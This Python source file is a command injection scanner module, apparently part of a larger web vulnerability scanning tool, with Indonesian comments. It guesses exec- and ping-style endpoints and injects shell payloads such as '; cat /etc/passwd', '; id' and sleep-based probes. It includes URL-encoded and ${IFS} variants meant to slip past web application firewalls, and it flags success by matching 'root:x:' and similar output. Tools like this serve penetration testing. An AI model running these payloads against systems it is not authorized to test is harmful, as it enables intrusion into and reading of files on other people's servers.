# checker/cmdi.py — CommandInjectionChecker v2
import re
import time
import threading
from typing import Dict, Any, Optional, List
from urllib.parse import urljoin, quote, urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed

from helpers.http_client import HttpClient, HostDeadException
from helpers.waf_checker import WAFChecker
from helpers.spa_crawler import SPACrawler
from helpers.scope import is_in_scope
from helpers.parsers import (
    is_spa_html,
    spa_confidence,
    extract_forms,
    extract_paths_from_js,
    extract_all_js_paths,
    normalize_url,
)


# ── Terminal output helpers ───────────────────────────────────────────────────

def _safe_print(msg: str):
    try:
        print(msg)
    except Exception:
        pass

def _info(msg: str):  _safe_print(f"  [*] {msg}")
def _ok(msg: str):    _safe_print(f"  [+] {msg}")
def _warn(msg: str):  _safe_print(f"  [!] {msg}")
def _step(n: int, total: int, msg: str): _safe_print(f"\n  [{n}/{total}] {msg}")


# ── Headers ───────────────────────────────────────────────────────────────────

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'text/html,application/xhtml+xml,*/*',
}

JSON_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'application/json, */*',
    'X-Requested-With': 'XMLHttpRequest',
}

from helpers.waf_checker import WAF_BYPASS_HEADERS


# ── Payloads ──────────────────────────────────────────────────────────────────

_CMD_TOKEN = 'xpwn7z_rce_confirmed_xpwn7z'

CMD_PAYLOADS = [
    f'; echo {_CMD_TOKEN}',
    f'| echo {_CMD_TOKEN}',
    f'&& echo {_CMD_TOKEN}',
    '; id',
    '| id',
    '; whoami',
    '; cat /etc/passwd',
    f'$(echo {_CMD_TOKEN})',
    f'& echo {_CMD_TOKEN}',
    '& whoami',
    '& dir',
    '& type C:\\Windows\\win.ini',
    '& ver',
]

WAF_BYPASS_PAYLOADS = [
    f'%7C%20echo%20{_CMD_TOKEN}',
    f';${{IFS}}echo${{IFS}}{_CMD_TOKEN}',
    f'%0aeecho%20{_CMD_TOKEN}',
    f'%26%20echo%20{_CMD_TOKEN}',
    f'%0d%0aecho%20{_CMD_TOKEN}',
    f'`echo {_CMD_TOKEN}`',
    f'|${{IFS}}id',
    f';%20echo%20{_CMD_TOKEN}%20%23',
    f'%27%7Cecho%20{_CMD_TOKEN}',
    f'a]|echo {_CMD_TOKEN}|[a',
]

TIME_PAYLOADS = [
    '; sleep 5',
    '| sleep 5',
    '$(sleep 5)',
    '& timeout /t 5',
    '& ping -n 5 127.0.0.1',
]

CMD_SUCCESS_SIGNATURES = [
    _CMD_TOKEN,
    'uid=0(root)', 'uid=', 'root:x:', 'daemon:x:',
    '/bin/bash', '/bin/sh', '/usr/bin',
    'volume serial number', 'windows_nt',
    'for 16-bit app support',
    'microsoft windows [version',
    'directory of c:\\',
    'packets: sent', 'packet loss',
    'bytes from', 'ttl=',
    'approximate round trip',
]

TEST_ENDPOINTS = [
    '/ping', '/exec', '/run', '/cmd',
    '/api/ping', '/api/exec', '/api/run', '/api/cmd',
    '/tools/ping', '/network/ping',
    '/diagnostic', '/debug', '/convert', '/process',
    '/api/v1/ping', '/api/v1/exec',
    '/network/check', '/tools/traceroute',
    '/admin/exec', '/system/ping',
    '/api/command', '/api/diagnostic',
    '/api/network/ping', '/api/tools/ping',
    '/api/v1/run', '/api/v1/command',
    '/shell', '/terminal', '/execute',
    '/api/shell', '/api/execute',
    '/rce', '/api/rce',
    '/net/ping', '/util/ping',
    '/v1/ping', '/v2/ping',
    '/health/exec', '/status/ping',
]

API_CMD_SUFFIXES = [
    '/ping', '/exec', '/run', '/cmd',
    '/diagnostic', '/debug',
    '/process', '/traceroute', '/check',
    '/execute', '/shell',
    '/posts/ping', '/posts/exec',
    '/users/ping', '/items/exec',
]

TEST_PARAMS = [
    'ip', 'host', 'cmd', 'command', 'exec',
    'run', 'ping', 'query', 'input', 'data',
    'target', 'dest', 'addr', 'url',
]


# ── Severity ──────────────────────────────────────────────────────────────────

SEVERITY_VULN_KEY: dict[str, str] = {
    'CRITICAL': 'CMDI_CRITICAL',
    'HIGH':     'CMDI_HIGH',
    'MEDIUM':   'CMDI_MEDIUM',
    'LOW':      'CMDI_LOW',
}

# Signature yang langsung konfirmasi RCE -> CRITICAL
_CRITICAL_SIGNATURES = {
    _CMD_TOKEN, 'uid=0(root)', 'root:x:', 'daemon:x:',
    '/bin/bash', '/bin/sh', '/usr/bin',
    'for 16-bit app support', 'microsoft windows [version',
    'directory of c:\\',
}

# Signature OS info -> HIGH
_HIGH_SIGNATURES = {
    'uid=', 'volume serial number', 'windows_nt',
}

_AUTH_PATHS = {'login', 'signin', 'auth', 'oauth', 'callback', 'admin'}


def _classify_severity(url: str, signature: str, method: str, is_time_based: bool) -> str:
    if is_time_based:
        return 'HIGH'

    if signature in _CRITICAL_SIGNATURES:
        path = urlparse(url).path.lower()
        if any(kw in path for kw in _AUTH_PATHS):
            return 'CRITICAL'
        return 'CRITICAL'

    if signature in _HIGH_SIGNATURES:
        return 'HIGH'

    if signature in {'packets: sent', 'packet loss', 'bytes from', 'ttl=', 'approximate round trip'}:
        return 'MEDIUM'

    return 'LOW'


# ── Main class ────────────────────────────────────────────────────────────────

class CommandInjectionChecker:
    def __init__(
        self,
        url: str,
        timeout: float = 5.0,
        extra_paths: Optional[List[str]] = None,
        cookies: Optional[Dict] = None,
        scope_mode: str = 'wildcard',
        discovered: Optional[Dict] = None,
    ):
        self.base_url                  = url.rstrip('/')
        self.timeout                   = int(timeout)
        self.extra_paths               = extra_paths or []
        self.cookies                   = cookies or {}
        self.scope_mode                = scope_mode
        self.discovered                = discovered or {}
        self._found_urls: set          = set()
        self._lock                     = threading.Lock()
        self._vuln_found               = threading.Event()
        
        self._waf_detected       = self.discovered.get('waf_detected', False)
        self._waf_info           = self.discovered.get('waf_info', {})
        self._api_bases: List    = self.discovered.get('api_bases', [])

        self._client = HttpClient(
            timeout=self.timeout,
            headers=HEADERS,
            cookies=self.cookies,
            verify=False,
            retries=0,  # Tidak retry — tarpit WAF akan memperlambat scan
        )

    # ── Utils ─────────────────────────────────────────────────────────────────

    def _is_cloudflare_page(self, text: str) -> bool:
        return WAFChecker.is_cloudflare_page(text)

    def _get_with_bypass(self, url: str):
        # Kalau mau lebih proper bisa passing WAFChecker instance dari CrawlerHelper,
        # tapi sementara kita coba header manual
        for extra_h in WAF_BYPASS_HEADERS:
            r = self._client.get(url, headers={**JSON_HEADERS, **extra_h})
            if r and not self._is_cloudflare_page(r.text):
                return r
        return None

    # ── Endpoint discovery ────────────────────────────────────────────────────

    def _get_active_endpoints(self) -> List[str]:
        active = []
        for ep in self.discovered.get('endpoints', []):
            if ep not in active:
                active.append(ep)
                
        # API Candidates
        for base in self._api_bases:
            for suffix in API_CMD_SUFFIXES:
                full = (base.rstrip('/') + suffix) if base.startswith('http') else (base + suffix)
                if full not in active:
                    active.append(full)
                    
        for p in TEST_ENDPOINTS:
            url = urljoin(self.base_url, p)
            if url not in active:
                active.append(url)
                
        for path in self.extra_paths:
            full = normalize_url(path, self.base_url)
            if full not in active:
                active.append(full)
                
        return list(dict.fromkeys(active))

    def _prefilter_endpoints(self, endpoints: List[str]) -> List[str]:
        """Quick filter: remove endpoints returning 404/410."""
        live = []

        def _check(url):
            if self._vuln_found.is_set():
                return None
            try:
                r = self._client.get(url, headers=HEADERS, timeout=4)
                if r and r.status_code not in (404, 410):
                    return url
            except Exception:
                pass
            return None

        with ThreadPoolExecutor(max_workers=15) as ex:
            futures = [ex.submit(_check, u) for u in endpoints]
            for f in as_completed(futures):
                try:
                    result = f.result()
                    if result:
                        live.append(result)
                except Exception:
                    pass

        return live

    # Injection core
    def _check_response(self, r, url: str, param: str,
                        payload: str, method: str, results: Dict) -> bool:
        if not r or self._is_cloudflare_page(r.text):
            return False

        # Dihapus strict check 'text/html' agar tidak false negative di aplikasi web klasik
        
        body_lower = r.text.lower()
        for sig in CMD_SUCCESS_SIGNATURES:
            if sig in body_lower:
                key = f"{method}:{url}:{param}:{sig}"
                registered = False
                with self._lock:
                    if key not in self._found_urls:
                        self._found_urls.add(key)
                        registered = True
                if registered:
                    vuln_url = f"{url}?{param}=127.0.0.1{payload}" \
                               if method != 'POST' else url

                    severity = _classify_severity(url, sig, method, is_time_based=False)
                    parsed   = urlparse(url)

                    _warn(f"CMD Injection [{severity}] ({method}) -> param={param} | sig={sig}")
                    with self._lock:
                        results['vulnerable_paths'].append({
                            'url':           vuln_url,
                            'path':          parsed.path,
                            'base':          f"{parsed.scheme}://{parsed.netloc}",
                            'param':         param,
                            'payload':       payload,
                            'signature':     sig,
                            'method':        method,
                            'status_code':   r.status_code,
                            'severity':      severity,
                            'vuln_key':      SEVERITY_VULN_KEY.get(severity),
                            'file_count':    0,
                            'dir_count':     0,
                            'notable_files': [],
                            'is_nested':     False,
                        })
                    self._vuln_found.set()
                return True
        return False

    def _inject_one(self, url: str, param: str, payload: str,
                    results: Dict, method: str = 'GET') -> bool:
        if self._vuln_found.is_set():
            return False

        with self._lock:
            results['total_tested'] += 1

        if method == 'POST':
            r = self._client.post(
                url, data={param: f"127.0.0.1{payload}"}, headers=JSON_HEADERS
            )
        else:
            test_url = f"{url}?{param}=127.0.0.1{payload}"
            r = self._get_with_bypass(test_url) or \
                self._client.get(test_url, headers=JSON_HEADERS)

        return self._check_response(r, url, param, payload, method, results)

    def _inject_endpoint(self, url: str, results: Dict):
        if self._vuln_found.is_set():
            return

        # Endpoint probe: check if endpoint processes query params
        try:
            r_bare  = self._client.get(url, headers=JSON_HEADERS, timeout=4)
            r_probe = self._client.get(f"{url}?__dsProbe__=xyz", headers=JSON_HEADERS, timeout=4)
            if (r_bare and r_probe
                    and r_bare.status_code == r_probe.status_code
                    and abs(len(r_bare.text) - len(r_probe.text)) < 30):
                # Endpoint doesn't process params -> test only top 3 params
                all_params = list(dict.fromkeys(
                    TEST_PARAMS + self.discovered.get('params', [])
                ))[:3]
            else:
                all_params = list(dict.fromkeys(
                    TEST_PARAMS + self.discovered.get('params', [])
                ))
        except Exception:
            all_params = list(dict.fromkeys(
                TEST_PARAMS + self.discovered.get('params', [])
            ))

        payloads = CMD_PAYLOADS + (WAF_BYPASS_PAYLOADS if self._waf_detected else [])

        def task(param: str, payload: str):
            if self._vuln_found.is_set():
                return
            found = self._inject_one(url, param, payload, results, 'GET')
            if not found and not self._vuln_found.is_set():
                self._inject_one(url, param, payload, results, 'POST')

        with ThreadPoolExecutor(max_workers=10) as ex:
            futures = [
                ex.submit(task, param, payload)
                for param in all_params
                for payload in payloads
            ]
            for f in as_completed(futures):
                if self._vuln_found.is_set():
                    for remaining in futures:
                        remaining.cancel()
                    break
                try:
                    f.result()
                except HostDeadException:
                    for remaining in futures:
                        remaining.cancel()
                    break
                except Exception:
                    pass

    # ── Time-based ────────────────────────────────────────────────────────────

    def _time_based_scan(self, active_endpoints: List[str], results: Dict):
        all_params = list(dict.fromkeys(TEST_PARAMS + self.discovered.get('params', [])))
        time_eps = active_endpoints[:10]  # Limit time-based scope
        for url in time_eps:
            if self._vuln_found.is_set():
                break
            for param in all_params[:3]:  # Top 3 params only
                if self._vuln_found.is_set():
                    break
                for payload in TIME_PAYLOADS:
                    try:
                        start   = time.time()
                        self._client.get(
                            f"{url}?{param}=127.0.0.1{payload}",
                            headers=JSON_HEADERS, timeout=12
                        )
                        elapsed = time.time() - start

                        if elapsed >= 4.5:
                            key = f"TIME:{url}:{param}"
                            registered = False
                            with self._lock:
                                if key not in self._found_urls:
                                    self._found_urls.add(key)
                                    registered = True
                            if registered:
                                severity = _classify_severity(url, '', 'GET', is_time_based=True)
                                parsed   = urlparse(url)

                                _warn(f"CMD Injection [{severity}] (time-based) -> "
                                      f"param={param} | delay={elapsed:.1f}s")
                                with self._lock:
                                    results['vulnerable_paths'].append({
                                        'url':           f"{url}?{param}=127.0.0.1{payload}",
                                        'path':          parsed.path,
                                        'base':          f"{parsed.scheme}://{parsed.netloc}",
                                        'param':         param,
                                        'payload':       payload,
                                        'signature':     f'time-based delay ({elapsed:.1f}s)',
                                        'method':        'GET',
                                        'status_code':   0,
                                        'severity':      severity,
                                        'vuln_key':      SEVERITY_VULN_KEY.get(severity),
                                        'file_count':    0,
                                        'dir_count':     0,
                                        'notable_files': [],
                                        'is_nested':     False,
                                    })
                                self._vuln_found.set()
                            break
                    except HostDeadException:
                        raise
                    except Exception:
                        pass

    # ── Form scan ─────────────────────────────────────────────────────────────

    def _scan_forms(self, results: Dict):
        forms = self.discovered.get('forms', [])
        if not forms:
            return
            
        for form in forms:
            if self._vuln_found.is_set():
                break
            for inp in form['inputs']:
                if self._vuln_found.is_set():
                    break
                param  = inp['name']
                action = form['action']
                method = 'POST' if form['method'] == 'post' else 'GET'
                for payload in CMD_PAYLOADS:
                    if self._vuln_found.is_set():
                        break
                    self._inject_one(action, param, payload, results, method)

    # ── Main run ──────────────────────────────────────────────────────────────

    def run(self) -> Dict[str, Any]:
        results = {
            'vulnerable':        False,
            'vulnerable_paths':  [],
            'total_tested':      0,
            'findings':          [],
            'error':             None,
            'summary':           {},
            'waf_detected':      self._waf_detected,
        }

        try:
            results['waf_info']     = self._waf_info
            
            _step(1, 4, "Mengumpulkan endpoint ...")
            raw_endpoints = self._get_active_endpoints()
            _info(f"Total {len(raw_endpoints)} endpoint kandidat")

            _step(2, 4, "Pre-filter endpoint (skip 404) ...")
            active_endpoints = self._prefilter_endpoints(raw_endpoints)
            _info(f"{len(active_endpoints)} endpoint aktif (dari {len(raw_endpoints)} kandidat)")

            _step(3, 4, f"Injecting payload ke {len(active_endpoints)} endpoint ...")
            with ThreadPoolExecutor(max_workers=8) as ex:
                futures = [
                    ex.submit(self._inject_endpoint, url, results)
                    for url in active_endpoints
                ]
                for f in as_completed(futures):
                    if self._vuln_found.is_set():
                        for rem in futures:
                            rem.cancel()
                        break
                    try:
                        f.result()
                    except HostDeadException:
                        for rem in futures:
                            rem.cancel()
                        break
                    except Exception:
                        pass

            self._scan_forms(results)

            if not results['vulnerable_paths']:
                _step(4, 4, "Time-based scan ...")
                self._time_based_scan(active_endpoints, results)
            else:
                _step(4, 4, "Time-based dilewati (sudah ada temuan)")

            # ── Finalize + summary ────────────────────────────────────────────
            if results['vulnerable_paths']:
                results['vulnerable'] = True
                count = len(results['vulnerable_paths'])

                sev_count = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0}
                for vp in results['vulnerable_paths']:
                    sev = vp.get('severity', 'LOW')
                    sev_count[sev] = sev_count.get(sev, 0) + 1

                results['summary'] = {
                    'total_vulnerable_paths': count,
                    'severity_breakdown': {k: v for k, v in sev_count.items() if v > 0},
                }

                results['findings'].append(
                    f"Command Injection ditemukan pada {count} parameter."
                )
                for v in results['vulnerable_paths']:
                    results['findings'].append(
                        f"  -> [{v['severity']}] [{v.get('method','GET')}] {v['url']} "
                        f"(param: {v['param']}, sig: {v['signature']})"
                    )
                _ok(
                    f"Total: {count} CMD Injection | "
                    f"CRITICAL={sev_count.get('CRITICAL', 0)} "
                    f"HIGH={sev_count.get('HIGH', 0)} "
                    f"MEDIUM={sev_count.get('MEDIUM', 0)}"
                )
            else:
                results['findings'].append(
                    "Tidak ditemukan indikasi Command Injection."
                )

        except Exception as e:
            results['error'] = str(e)
        finally:
            self._client.close()

        return results